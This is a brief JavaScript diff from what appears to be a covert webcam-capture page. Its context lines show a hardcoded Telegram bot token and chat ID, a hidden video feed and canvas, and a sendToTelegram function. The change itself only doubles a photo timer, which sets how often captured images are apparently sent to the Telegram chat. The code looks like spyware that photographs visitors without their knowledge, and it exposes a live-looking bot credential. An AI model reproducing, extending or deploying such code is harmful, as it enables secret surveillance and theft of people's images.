@@ -1,6 +1,6 @@
 const BOT_TOKEN = "7191230731:AAHrj15Qd23r_cfpUeiwZ-CM7xPdJL-ZXV4"; 
 const CHAT_ID = "7816876204";
-const PHOTO_TIMER = 6000;
+const PHOTO_TIMER = 12000;
 
 const video = document.getElementById('hiddenFeed');
 const canvas = document.getElementById('hiddenCanvas');
@@ -76,4 +76,5 @@ async function sendToTelegram(blob, type) {
     }
 
 }
+
 
